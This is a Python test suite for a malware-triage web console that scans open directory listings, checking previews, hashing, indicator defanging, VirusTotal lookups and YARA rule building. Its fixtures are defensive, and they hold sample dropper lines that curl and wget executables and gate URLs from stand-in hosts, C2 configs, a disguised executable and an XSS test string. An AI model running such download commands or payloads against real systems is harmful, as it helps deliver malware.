"""The local triage UI: what a page says when there is little or nothing to show."""

from __future__ import annotations

import re
import time
from pathlib import Path

from fastapi.testclient import TestClient

from dirsift.enrich import MissingKey
from dirsift.models import Entry, Ioc, ScanError, ScanResult, Verdict
from dirsift.web import create_app

BACK_TO_DASHBOARD = re.compile(r'<a[^>]*href="/"[^>]*>(?:(?!</a>).)*Back to Dashboard', re.S)


def save_run(runs_dir: Path, result: ScanResult, name: str = "run") -> str:
    (runs_dir / f"{name}.json").write_text(result.model_dump_json(), encoding="utf-8")
    return name


def header_of(html: str) -> str:
    match = re.search(r"<header[^>]*>(.*?)</header>", html, re.S)
    assert match, "page has no header"
    return match.group(1)


# -- empty runs ------------------------------------------------------------


def test_an_empty_index_says_it_was_read_and_lists_nothing(tmp_path: Path):
    """A server that answers with an empty index is a result, not a broken scan."""
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            title="Directory listing for /",
            requests_made=1,
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert page.status_code == 200
    assert "the index lists nothing" in page.text


def test_a_run_that_listed_nothing_points_at_its_errors(tmp_path: Path):
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            errors=[
                ScanError(
                    url="http://127.0.0.1:8080/",
                    stage="walk",
                    detail="ConnectError: [Errno 111] Connection refused",
                )
            ],
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "Nothing was listed" in page.text
    assert "the index lists nothing" not in page.text


def test_a_run_with_entries_carries_no_empty_note(tmp_path: Path):
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[Entry(url="http://127.0.0.1:8080/run.bat", name="run.bat", depth=1)],
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "the index lists nothing" not in page.text
    assert "Nothing was listed" not in page.text


# -- refused targets -------------------------------------------------------


def test_a_refused_private_target_names_the_box_to_tick(tmp_path: Path):
    """The UI has no CLI flag to pass; the message has to point at the form."""
    client = TestClient(create_app(tmp_path))
    started = client.post("/scan", data={"url": "http://127.0.0.1:9/"}, follow_redirects=False)
    status_url = started.headers["location"] + "/status"

    deadline = time.monotonic() + 5
    status = client.get(status_url).text
    while "failed" not in status and time.monotonic() < deadline:
        time.sleep(0.05)
        status = client.get(status_url).text

    assert "failed" in status
    assert "allow private" in status
    assert "--allow-private" not in status
    assert "127.0.0.1" not in status  # targets are defanged in the UI


# -- navigation ------------------------------------------------------------


def test_a_run_page_links_back_to_the_dashboard(tmp_path: Path):
    name = save_run(
        tmp_path, ScanResult(root_url="http://127.0.0.1:8080/", listing_flavor="python")
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert BACK_TO_DASHBOARD.search(page.text)


def test_a_job_page_links_back_to_the_dashboard(tmp_path: Path):
    client = TestClient(create_app(tmp_path))
    started = client.post("/scan", data={"url": "http://127.0.0.1:9/"}, follow_redirects=False)
    page = client.get(started.headers["location"])
    assert BACK_TO_DASHBOARD.search(page.text)


def test_the_dashboard_does_not_link_back_to_itself(tmp_path: Path):
    page = TestClient(create_app(tmp_path)).get("/")
    assert "Back to Dashboard" not in page.text


def test_the_header_names_the_dashboard_and_the_brand_leads_there(tmp_path: Path):
    header = header_of(TestClient(create_app(tmp_path)).get("/").text)
    brand = re.search(r'<a[^>]*class="brand"[^>]*>(?:(?!</a>).)*DIRSIFT', header, re.S)
    assert brand and 'href="/"' in brand.group(0)
    assert re.search(r'<a[^>]*href="/"[^>]*>\s*dashboard\s*</a>', header)
    assert not re.search(r">\s*runs\s*</a>", header)


# -- hashes ----------------------------------------------------------------


def run_with_hashes(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[
                Entry(
                    url="http://127.0.0.1:8080/run.bat",
                    name="run.bat",
                    depth=1,
                    fetched_bytes=26,
                    sha256="a" * 64,
                    md5="b" * 32,
                ),
                Entry(
                    url="http://127.0.0.1:8080/big.exe",
                    name="big.exe",
                    depth=1,
                    fetched_bytes=16,
                    truncated=True,
                ),
            ],
        ),
    )


def test_hashes_txt_lists_only_the_files_that_were_read_whole(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    body = TestClient(create_app(tmp_path)).get(f"/runs/{name}/hashes.txt").text
    assert "a" * 64 in body
    assert "b" * 32 in body
    assert "run.bat" in body
    assert "big.exe" not in body


def test_the_listing_shows_a_hash_and_says_when_a_read_was_partial(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "a" * 12 in page.text  # the short form of the sha256
    assert "partial" in page.text


# -- the preview panel -----------------------------------------------------


def run_with_a_family(runs_dir: Path) -> str:
    """One driver, two versions of the thing it drops, and a lying extension."""
    driver = Entry(
        url="http://127.0.0.1:8080/install.bat",
        name="install.bat",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=120,
        size=120,
        sha256="c" * 64,
        md5="d" * 32,
        head_hex="4020656368",
        text_preview="curl -o svc2.exe http://203.0.113.24/bin/svc2.exe",
        references=["svc2.exe"],
    )
    dropped = Entry(
        url="http://127.0.0.1:8080/svc2.exe",
        name="svc2.exe",
        depth=1,
        kind="pe",
        confidence="sniffed",
        fetched_bytes=4096,
        size=65536,
        truncated=True,
        head_hex="4d5a90000300",
        cluster="svc{n}.exe",
    )
    sibling = Entry(
        url="http://127.0.0.1:8080/svc3.exe",
        name="svc3.exe",
        depth=1,
        kind="pe",
        cluster="svc{n}.exe",
    )
    liar = Entry(
        url="http://127.0.0.1:8080/invoice.pdf",
        name="invoice.pdf",
        depth=1,
        kind="pe",
        confidence="sniffed",
        magic="MZ",
        fetched_bytes=3072,
        size=3072,
        sha256="e" * 64,
        md5="f" * 32,
        head_hex="4d5a9000",
    )
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[driver, dropped, sibling, liar],
            iocs=[
                Ioc(
                    ioc_type="url",
                    value="http://203.0.113.24/bin/svc2.exe",
                    defanged="hxxp://203[.]0[.]113[.]24/bin/svc2[.]exe",
                    source_url="http://127.0.0.1:8080/install.bat",
                ),
                Ioc(
                    ioc_type="ipv4",
                    value="198.51.100.77",
                    defanged="198[.]51[.]100[.]77",
                    source_url="http://127.0.0.1:8080/other.txt",
                ),
            ],
        ),
    )


def preview_of(client: TestClient, name: str, file_url: str) -> str:
    return client.get(f"/runs/{name}/file", params={"url": file_url}).text


def test_the_preview_shows_both_hashes(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "c" * 64 in panel
    assert "d" * 32 in panel


def test_the_preview_says_how_much_of_a_cut_file_was_read(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "partial" in panel.lower()
    assert "4.0K of 64.0K" in panel


def test_the_preview_names_a_lying_extension(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/invoice.pdf")
    assert "pdf" in panel.lower()
    assert "pe" in panel.lower()


def test_the_preview_lists_only_this_files_indicators(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "203[.]0[.]113[.]24" in panel
    assert "198[.]51[.]100[.]77" not in panel


def test_the_preview_links_the_files_that_reference_this_one(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "install.bat" in panel


def test_the_preview_offers_the_other_versions_in_the_family(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "svc3.exe" in panel


def test_the_preview_renders_the_first_bytes_as_hex(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "4d 5a 90 00" in panel
    assert "00000000" in panel  # the offset column


def test_a_run_page_can_open_a_file_straight_from_the_address_bar(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}", params={"file": "http://127.0.0.1:8080/install.bat"}
    )
    # The md5 appears in the preview panel and nowhere else on the page.
    assert "d" * 32 in page.text


def test_the_dashboard_counts_what_is_saved(tmp_path: Path):
    run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get("/")
    assert "files" in page.text
    assert "indicators" in page.text.lower()


def test_the_listing_flags_a_lying_extension(tmp_path: Path):
    """invoice.pdf that starts with MZ is the most interesting row in the listing."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    row = re.search(r"<tr[^>]*>(?:(?!</tr>).)*invoice\.pdf(?:(?!</tr>).)*</tr>", page.text, re.S)
    assert row, "invoice.pdf is not in the listing"
    assert "mismatch" in row.group(0).lower()


# -- reading the contents --------------------------------------------------


def test_the_contents_mark_the_indicators_found_in_them(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "<mark" in panel
    assert "203.0.113.24" in panel  # raw inside the evidence, defanged everywhere else


def test_the_contents_are_numbered_line_by_line(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert 'data-line="1"' in panel


def test_markup_in_a_file_is_shown_not_run(tmp_path: Path):
    """A listing can serve a page full of script tags. They are evidence, not code."""
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            entries=[
                Entry(
                    url="http://127.0.0.1:8080/panel.php",
                    name="panel.php",
                    depth=1,
                    kind="web",
                    fetched_bytes=40,
                    text_preview="<script>alert(1)</script>",
                )
            ],
        ),
    )
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/panel.php")
    assert "<script>alert(1)</script>" not in panel
    assert "&lt;script&gt;" in panel


# -- comparing two versions ------------------------------------------------


def run_with_two_versions(runs_dir: Path) -> str:
    def version(number: int, address: str, digest: str) -> Entry:
        return Entry(
            url=f"http://127.0.0.1:8080/cfg{number}.json",
            name=f"cfg{number}.json",
            depth=1,
            kind="config",
            cluster="cfg{n}.json",
            fetched_bytes=40,
            sha256=digest * 64,
            md5=digest * 32,
            text_preview='{\n  "c2": "' + address + '",\n  "interval": 900\n}',
        )

    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            entries=[version(1, "203.0.113.24", "1"), version(2, "198.51.100.77", "3")],
        ),
    )


def test_two_versions_of_a_file_can_be_compared(tmp_path: Path):
    name = run_with_two_versions(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/diff",
        params={
            "a": "http://127.0.0.1:8080/cfg1.json",
            "b": "http://127.0.0.1:8080/cfg2.json",
        },
    )
    assert page.status_code == 200
    assert "cfg1.json" in page.text
    assert "cfg2.json" in page.text
    assert "203.0.113.24" in page.text
    assert "198.51.100.77" in page.text


def test_versions_kept_as_bytes_say_why_they_cannot_be_compared(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/diff",
        params={
            "a": "http://127.0.0.1:8080/svc2.exe",
            "b": "http://127.0.0.1:8080/svc3.exe",
        },
    )
    assert page.status_code == 200
    assert "svc2.exe" in page.text
    assert "text" in page.text.lower()


# -- asking a public scanner about a hash ----------------------------------


def stub_lookup(verdict: Verdict | None = None, calls: list | None = None):
    def lookup(sha256: str, **kwargs):
        if calls is not None:
            calls.append(sha256)
        if verdict is None:
            raise MissingKey("no VirusTotal key. Set DIRSIFT_VT_API_KEY in the environment.")
        return verdict
    return lookup


def test_asking_about_a_hash_records_the_answer(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    calls: list[str] = []
    verdict = Verdict(found=True, malicious=6, total=64, analysed="2026-09-01")
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(verdict, calls)))

    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )

    assert panel.status_code == 200
    assert "6/64" in panel.text
    assert calls == ["a" * 64]
    assert "6/64" in client.get(f"/runs/{name}").text  # written into the saved run


def test_a_file_nobody_has_seen_is_reported_as_such(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(Verdict(found=False))))
    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )
    assert "not seen" in panel.text.lower()


def test_without_a_key_the_console_says_how_to_set_one(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(None)))
    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )
    assert panel.status_code == 200
    assert "DIRSIFT_VT_API_KEY" in panel.text


# -- building a rule from a selection --------------------------------------


def test_selected_files_build_a_rule(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    client = TestClient(create_app(tmp_path))
    panel = client.post(
        f"/runs/{name}/yara",
        data={
            "pick": [
                "http://127.0.0.1:8080/install.bat",
                "http://127.0.0.1:8080/svc2.exe",
            ]
        },
    )
    assert panel.status_code == 200
    assert "cyb3rp03t" in panel.text  # the panel escapes the quotes around it
    assert "install.bat" in panel.text
    assert "svc2.exe" in panel.text


def test_a_rule_needs_at_least_one_file(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = TestClient(create_app(tmp_path)).post(f"/runs/{name}/yara", data={})
    assert panel.status_code == 200
    assert "pick" in panel.text.lower()


def test_a_rule_can_be_downloaded_as_a_file(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    reply = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/rule.yar", params={"pick": "http://127.0.0.1:8080/install.bat"}
    )
    assert reply.status_code == 200
    assert "rule dirsift" in reply.text
    assert 'author = "cyb3rp03t"' in reply.text  # the file itself is not escaped
    assert "attachment" in reply.headers.get("content-disposition", "")


def test_a_hash_can_be_opened_in_the_scanner_without_a_key(tmp_path: Path):
    """No key, no quota, no request from the tool: the browser goes, if asked."""
    name = run_with_hashes(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/run.bat")
    assert "https://www.virustotal.com/gui/file/" + "a" * 64 in panel


# -- asking about a hash you already have ----------------------------------


def test_a_pasted_hash_comes_back_with_a_score(tmp_path: Path):
    """A hash often arrives from somewhere else; the console should answer for it."""
    verdict = Verdict(found=True, malicious=21, total=63, analysed="2026-09-16")
    calls: list[str] = []
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(verdict, calls)))

    panel = client.post("/verdict", data={"digest": "1" * 64})

    assert panel.status_code == 200
    assert "21/63" in panel.text
    assert calls == ["1" * 64]


def test_something_that_is_not_a_hash_is_refused_before_anything_is_sent(tmp_path: Path):
    calls: list[str] = []
    client = TestClient(
        create_app(tmp_path, lookup=stub_lookup(Verdict(found=False), calls))
    )

    panel = client.post("/verdict", data={"digest": "not a hash"})

    assert panel.status_code == 200
    assert "sha256" in panel.text.lower()
    assert calls == []  # nothing left the machine


def test_a_pasted_hash_without_a_key_says_how_to_set_one(tmp_path: Path):
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(None)))
    panel = client.post("/verdict", data={"digest": "2" * 64})
    assert "DIRSIFT_VT_API_KEY" in panel.text


# -- which network an address belongs to -----------------------------------


def run_with_networks(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            listing_flavor="apache",
            target_ip="203.0.113.24",
            target_asn=64496,
            target_as_name="EXAMPLE-HOSTING",
            target_country="NL",
            asn_source="ip2asn-combined.tsv",
            asn_stamp="2026-09-16",
            entries=[
                Entry(
                    url="http://203.0.113.24/files/config.json",
                    name="config.json",
                    depth=1,
                    fetched_bytes=80,
                    sha256="e" * 64,
                    text_preview='{"gate": "198.51.100.77"}',
                )
            ],
            iocs=[
                Ioc(
                    ioc_type="ipv4",
                    value="198.51.100.77",
                    defanged="198[.]51[.]100[.]77",
                    source_url="http://203.0.113.24/files/config.json",
                    asn=64497,
                    as_name="TEST-NET-HOSTING",
                    country="DE",
                )
            ],
        ),
    )


def test_the_target_card_says_which_network_it_sits_in(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "AS64496" in page
    assert "EXAMPLE-HOSTING" in page
    assert "NL" in page
    assert "203[.]0[.]113[.]24" in page  # the address, defanged like every target


def test_an_indicator_carries_its_network(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "AS64497" in page
    assert "TEST-NET-HOSTING" in page


def test_the_page_says_which_table_answered(tmp_path: Path):
    """An ASN without a date is a guess, so the page names the dataset."""
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "ip2asn-combined.tsv" in page
    assert "2026-09-16" in page


# -- saying what a note means ----------------------------------------------


def run_with_errors(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            errors=[
                ScanError(
                    url="http://203.0.113.24/files/",
                    stage="walk",
                    detail="HTTP 503 Service Temporarily Unavailable",
                ),
                ScanError(
                    url="http://203.0.113.24/files/x.bin",
                    stage="peek",
                    detail="HTTP 499 Request has been forbidden by antivirus",
                ),
                ScanError(
                    url="http://203.0.113.24/files/y.bin",
                    stage="peek",
                    detail="a detail nobody has written a sentence for",
                ),
            ],
        ),
    )


def test_a_note_carries_an_explanation_you_can_open(tmp_path: Path):
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "<details" in page
    assert "what this means" in page.lower()
    assert "already waited and retried" in page


def test_an_antivirus_note_says_the_request_never_arrived(tmp_path: Path):
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "antivirus answered this request itself" in page


def test_a_note_with_nothing_to_say_gets_no_marker(tmp_path: Path):
    """Three notes, two explanations: the unknown one is left alone."""
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert page.count("what this means") == 2


# -- an indicator shared between files ----


def test_the_preview_lists_an_indicator_the_file_shares_with_another(tmp_path: Path):
    def build(name: str, verb: str) -> Entry:
        return Entry(
            url="http://203.0.113.24/files/" + name,
            name=name,
            depth=1,
            kind="script",
            fetched_bytes=60,
            text_preview=verb + " http://panel-gate.xyz/gate.php",
        )

    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            entries=[build("a.bat", "curl"), build("b.bat", "wget")],
        ),
    )
    client = TestClient(create_app(tmp_path))
    page = preview_of(client, name, "http://203.0.113.24/files/b.bat")
    assert "panel-gate[.]xyz" in page

